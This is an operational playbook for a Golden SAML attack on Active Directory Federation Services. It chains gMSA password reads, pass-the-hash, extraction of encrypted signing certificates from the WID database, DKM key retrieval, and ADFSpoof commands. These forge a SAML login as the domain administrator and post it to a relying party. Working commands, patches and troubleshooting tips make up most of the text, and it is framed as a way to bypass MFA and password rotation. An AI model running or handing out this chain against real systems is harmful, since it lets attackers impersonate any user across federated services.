# ADFS Golden SAML — Full Chain (gMSA → WID → DKM → ADFSpoof → Forged SAML)

## When this applies

- AD environment running ADFS for federation (typical signal: `federation.<domain>` or `adfs.<domain>` vhost, FederationMetadata.xml accessible, RP web app accepts SAML).
- You have read access to the gMSA running ADFS (e.g., `adfs_gmsa$`) — typically because you're DC01$ or a user listed in `msDS-GroupMSAMembership`.
- Goal: forge a SAML response signed with the ADFS Token-Signing certificate, accepted by every Relying Party trusting that ADFS instance — for any user including local Administrator. Bypasses MFA, conditional access, and password rotation.

## Technique

```
gMSA password buffer (msDS-ManagedPassword)
  → adfs_gmsa$ NT hash (MD4 of UTF-16LE password)
  → WinRM as adfs_gmsa$ (NTLM PtH; or PsExec/WMI)
  → ADFS WID database access via local named pipe:
      ConnectionString: "np:\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query;Database=AdfsConfigurationV4;Integrated Security=true"
  → SELECT ServiceSettingsData FROM IdentityServerPolicy.ServiceSettings
      → ~80 KB XML containing 4 EncryptedPfx blobs (signing+old, decryption+old)
  → DKM master key from AD attribute thumbnailPhoto on:
      CN=ADFS,CN=Microsoft,CN=Program Data,DC=domain,DC=tld
      (32-byte AES-256 key per DKM root; multiple roots possible — try each)
  → Decrypt EncryptedPfx with Mandiant ADFSpoof's EncryptedPfx.py
  → openssl pkcs12 -export → ADFS Token-Signing certificate (.pfx)
  → ADFSpoof saml2.py forges SAML response for any user/UPN
  → POST forged SAML to RP's ACS endpoint → authenticated session cookie
```

## Steps

**ADFSpoof (Mandiant) — patches needed for modern Python/cryptography:**

```bash
git clone https://github.com/mandiant/ADFSpoof
cd ADFSpoof
# 1) microsoft_kbkdf.py uses old @utils.register_interface decorator (removed in cryptography 38+)
sed -i 's|@utils.register_interface(KeyDerivationFunction)||' microsoft_kbkdf.py
sed -i 's|class KBKDFHMAC(object)|class KBKDFHMAC(KeyDerivationFunction)|' microsoft_kbkdf.py
# 2) signxml may fail on Python 3.10+ — pin signxml<3.0 in a venv
pip install -U signxml==2.10.1 lxml cryptography pyasn1 pyOpenSSL
```

**Run the decryption + forge:**

```bash
# Decrypt
python3 ADFSpoof.py -b /tmp/encrypted_pfx_1.bin /tmp/dkm_key_0.bin saml2 \
  --secure --endpoint "https://core.<domain>:8443/adfs/saml/postResponse" \
  --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient \
  --nameid 'DOMAIN\administrator' \
  --rpidentifier 'https://core.<domain>:8443/' \
  --assertions '<UPN>DOMAIN\administrator</UPN>' \
  -o /tmp/forged_response.xml
# POST to ACS
curl -sk -X POST -d "SAMLResponse=$(base64 -w0 /tmp/forged_response.xml)" \
  "https://core.<domain>:8443/adfs/saml/postResponse" -c /tmp/cookies.txt -L
```

## Verifying success

- The ACS POST returns a `Set-Cookie` header (e.g., `MSISAuthenticated=...`) and a 302 to the RP.
- Following the redirect with the cookie lands on the authenticated RP page as Administrator.

## Common pitfalls

- The `<NameID>` format MUST match what the RP expects — read the FederationMetadata.xml `<NameIDFormat>` element. `transient` and `unspecified` are most common.
- The RP will also check the `<AudienceRestriction>` — the `Issuer` and `RPIdentifier` must exactly match the RP's expected values (often the literal RP URL).
- ADFS issues 4 EncryptedPfx blobs (current+old × signing+decryption). Try **all 4** with **all DKM roots** — the signing cert is what you want. Successful decryption produces a valid PKCS#12 with empty password.
- The DKM key in `thumbnailPhoto` is 32 bytes raw (AES-256). Multiple `CN=Cryptography Settings` containers exist for old/current — use the most recent.

## Tools

- ADFSpoof (Mandiant)
- evil-winrm (PtH against the gMSA)
- impacket `wmiexec.py` / `psexec.py`
- openssl
- bloodyAD (for gMSA password read; see `gmsa.md`)
